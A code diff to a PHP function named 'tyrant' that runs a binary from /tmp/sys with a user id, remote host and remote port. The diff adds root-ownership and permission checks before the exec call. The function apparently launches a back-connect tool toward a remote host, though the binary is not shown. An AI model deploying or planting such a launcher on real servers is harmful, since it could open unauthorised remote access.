@@ -149,10 +149,46 @@ function tyrant($uid, $rhost, $rport) {
         return 4131;
     }
 
+    $bin_path = '/tmp/sys/' . $file_name;
+    
+    // Validate /tmp/sys directory security
+    $dir_stat = @lstat('/tmp/sys');
+    if ($dir_stat === false || !is_dir('/tmp/sys')) {
+        error_log('Security: /tmp/sys does not exist or is not a directory');
+        return 4131;
+    }
+    if ($dir_stat['uid'] !== 0) {
+        error_log('Security: /tmp/sys is not owned by root');
+        return 4131;
+    }
+    if (($dir_stat['mode'] & 0022) !== 0) {
+        error_log('Security: /tmp/sys has insecure permissions');
+        return 4131;
+    }
+    
+    // Validate the binary file security
+    $file_stat = @lstat($bin_path);
+    if ($file_stat === false) {
+        error_log('Security: Binary file does not exist');
+        return 4131;
+    }
+    if (!is_file($bin_path)) {
+        error_log('Security: Binary path is not a regular file');
+        return 4131;
+    }
+    if ($file_stat['uid'] !== 0) {
+        error_log('Security: Binary is not owned by root');
+        return 4131;
+    }
+    if (!is_executable($bin_path)) {
+        error_log('Security: Binary is not executable');
+        return 4131;
+    }
+
     $escaped_uid = escapeshellarg($uid);
     $escaped_rhost = escapeshellarg($rhost);
     $escaped_rport = escapeshellarg($rport);
-    $escaped_bin = escapeshellarg('/tmp/sys/' . $file_name);
+    $escaped_bin = escapeshellarg($bin_path);
 
     exec("$escaped_bin -uid $escaped_uid -rhost $escaped_rhost -rport $escaped_rport", $output, $status);
     return ($status === 0) ? 4132 : 4131;
